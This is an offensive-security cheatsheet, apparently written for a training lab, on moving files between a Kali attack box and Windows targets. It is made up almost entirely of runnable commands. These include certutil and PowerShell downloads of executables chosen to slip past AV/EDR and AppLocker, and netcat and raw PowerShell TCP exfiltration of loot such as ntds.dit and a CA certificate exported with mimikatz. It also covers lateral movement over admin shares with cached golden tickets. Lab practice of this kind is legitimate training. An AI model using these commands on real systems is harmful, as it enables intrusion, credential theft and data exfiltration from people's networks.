File Transfer Cheatsheet — Kali ⇄ Windows

Every practical way to move files between a Kali attack box and a Windows target, both directions, plus Windows-to-Windows for lateral movement. Pick based on what's open: HTTP out, SMB, PowerShell, or a raw port if nothing else works.

Kali → Windows Windows → Kali Windows → Windows
OUT

Kali → Windows (push a file to the target)

1. Python HTTP server + PowerShell download (most reliable, no extra tools)

Kali — serve the filepython3 -m http.server 8000
Windows — download it (PowerShell)iwr -uri http://<kali-ip>:8000/file.exe -outfile file.exe
older PS / more compatiblepowershell -c "(New-Object Net.WebClient).DownloadFile('http://<kali-ip>:8000/file.exe','C:\Users\Public\file.exe')"

Works on every modern Windows with PowerShell. certutil below is the fallback if PowerShell is blocked by AppLocker/CLM.

2. certutil (lives off the land — no PowerShell needed)

Windows cmd.execertutil.exe -urlcache -split -f http://<kali-ip>:8000/file.exe file.exe

Often whitelisted by AV/EDR since it's a signed Microsoft binary — a classic LOLBin. -split downloads in chunks, -f forces overwrite.

3. SMB share (impacket-smbserver)

Kali — spin up an anonymous SMB share of the current dirimpacket-smbserver share . -smb2support
Windows — copy from itcopy \\<kali-ip>\share\file.exe C:\Users\Public\file.exe

No credentials needed. Good when outbound HTTP is firewalled but SMB (445) isn't. Add -username/-password to impacket-smbserver if the target insists on auth.

4. FTP (python pyftpdlib)

Kalipython3 -m pyftpdlib -p 21 -w
Windows cmd.exeecho open <kali-ip> 21 > ftp.txt
echo anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo binary >> ftp.txt
echo get file.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt

-w allows writes too, handy if you also need Windows → Kali through the same server.

5. SCP / SSH (when Windows has OpenSSH client/server, e.g. Win10+)

Kali → push to Windows (Windows must run sshd)scp file.exe administrator@<win-ip>:C:\\Users\\Public\\file.exe

Needs Windows OpenSSH Server feature enabled and reachable creds — not always available, but clean when it is (as used for THMDC in the certificate-persistence steps above).

6. Base64 paste (no network path at all — through an existing shell)

Kali — encodebase64 -w0 file.exe > file.b64
Windows PowerShell — decode (paste the base64 string in)[IO.File]::WriteAllBytes("file.exe",[Convert]::FromBase64String("<paste b64 here>"))

Last resort for small files only — clipboard/RDP paste or copy-paste through a web shell when no listener/port is reachable either way.

IN

Windows → Kali (pull loot off the target)

1. PowerShell upload to a listening HTTP server

Kali — simplest receiver (uploadserver module)pip install uploadserver --break-system-packages
python3 -m uploadserver 8000
Windows PowerShell — POST the file upiwr -Uri http://<kali-ip>:8000/upload -Method POST -InFile loot.zip -ContentType "multipart/form-data"

If uploadserver isn't installed, use the SMB method below instead — it needs zero setup on Kali beyond impacket.

2. SMB share with write enabled (easiest two-way option)

Kali — start the share, require a loginimpacket-smbserver share . -smb2support -username a -password a
Windows — authenticate first, THEN copynet use \\<kali-ip>\share /user:a a
copy C:\loot\ntds.dit \\<kali-ip>\share\ntds.dit

Which username/password go where: -username a -password a on the Kali side just means "any client must log in as user a, password a to use this share" — these are not real Windows or domain credentials, impacket invents and accepts them itself. On the Windows side, net use \\<ip>\share /user:a a must supply the exact same username/password you picked on Kali (here, a / a) — think of it as a throwaway login just for this one transfer, unrelated to any domain account.

Drop -username/-password entirely from the Kali command for a fully anonymous share — then skip net use too and just copy straight to \\<kali-ip>\share\.... This is exactly the pattern used earlier for grabbing za-THMDC-CA.pfx off a DC and pulling it back to the attack box.

3a. SCP — run from Windows, push to Kali

Kali — make sure sshd is running (usually already is)sudo systemctl start ssh
Windows PowerShell or cmd.exe — push the file to Kaliscp C:\loot\ntds.dit kali@<kali-ip>:/home/kali/loot/

Username/password here: kali@<kali-ip> is a real login on the Kali box — use whatever Linux user account actually exists there (commonly kali, or root if SSH root login is enabled), and when prompted, type that Linux user's real password.

Needs Windows 10 1809+/Server 2019+ (OpenSSH client built in) and Kali's SSH port (22) reachable from the target.

3b. SCP — run from Kali, pull from Windows (target must run an SSH server)

Kali — connect out to Windows' sshd and pull the file inscp administrator@10.200.x.101:"C:\Users\Administrator.ZA\mandy\za-THMDC-CA.pfx" .

Username/password here: administrator must be a real Windows account on the target (10.200.x.101), and the password prompt wants that Windows account's real password — this is the exact command used earlier to pull za-THMDC-CA.pfx off THMDC after exporting the CA cert with mimikatz.

The file path after the colon is the Windows path to the file, in quotes (because of the spaces/backslashes) — C:\Users\Administrator.ZA\mandy\za-THMDC-CA.pfx. The trailing . means "save it into my current directory on Kali."

Only works if the target is running OpenSSH Server (not just the client) — common on lab DCs/servers set up for SSH management, but not a Windows default. If sshd isn't running on the target, fall back to the SMB or HTTP-pull methods instead.

4. Netcat (when nothing else is reachable but a raw port is)

Kali — listener, redirect stdout to a filenc -lvnp 4444 > loot.zip
Windows — send the file (nc.exe, or ncat)nc.exe <kali-ip> 4444 < loot.zip

No PowerShell's netcat equivalent built in — need nc.exe/ncat.exe staged on the box first, or use the PowerShell TCP client snippet below.

5. Raw TCP via PowerShell (zero extra binaries)

Kalinc -lvnp 4444 > loot.zip
Windows PowerShell$c = New-Object System.Net.Sockets.TCPClient("<kali-ip>",4444)
$s = $c.GetStream()
$b = [IO.File]::ReadAllBytes("loot.zip")
$s.Write($b,0,$b.Length)
$s.Close(); $c.Close()

Pure PowerShell, nothing to upload to the target first — good for AV-restricted environments.

6. Base64 exfil through an existing shell

Windows PowerShell — print base64 to console[Convert]::ToBase64String([IO.File]::ReadAllBytes("secret.txt"))
Kali — paste it back and decodeecho "<paste b64 here>" | base64 -d > secret.txt

Only for small text-ish files — console/RDP copy-paste is the transport, no network needed at all.

LATERAL

Windows → Windows (lateral movement)

1. Admin share (C$ / ADMIN$)

From a box with domain admin / local admin creds on the targetcopy file.exe \\<target-ip>\C$\Windows\Temp\file.exe
or, authenticating explicitly firstnet use \\<target-ip>\C$ /user:DOMAIN\administrator Password123
copy file.exe \\<target-ip>\C$\Windows\Temp\file.exe

Exactly the mechanism golden/silver tickets abuse — once a ticket is cached (klist shows it), copy/dir against \\host\c$ just works.

2. PowerShell remoting (WinRM)

Push a file over an existing PS session$s = New-PSSession -ComputerName target -Credential $cred
Copy-Item -ToSession $s -Path .\file.exe -Destination C:\Windows\Temp\file.exe

Needs WinRM (5985/5986) reachable and creds/ticket valid for that host.

Quick picks: HTTP (certutil/iwr) when outbound web is open · SMB (impacket-smbserver) when it isn't but 445 is · raw TCP/netcat as the last resort when only one arbitrary port is reachable.
